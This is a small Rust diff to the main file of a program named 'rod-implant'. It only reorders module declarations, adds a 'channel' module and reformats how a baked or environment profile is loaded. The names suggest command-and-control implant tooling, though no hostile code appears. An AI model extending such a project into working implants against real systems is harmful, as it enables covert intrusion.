@@ -1,6 +1,7 @@
 mod baked;
-mod envelope;
+mod channel;
 mod enroll;
+mod envelope;
 mod error;
 mod handlers;
 mod outbox;
@@ -21,8 +22,8 @@ mod wire;
 // machine, exit with its answer.
 
 fn main() {
-    let Some(profile) = profile::Profile::from_baked(baked::PROFILE)
-        .or_else(profile::Profile::from_env)
+    let Some(profile) =
+        profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
     else {
         eprintln!(
             "rod-implant: this build carries no baked profile and no ROD_* environment; nothing to run"
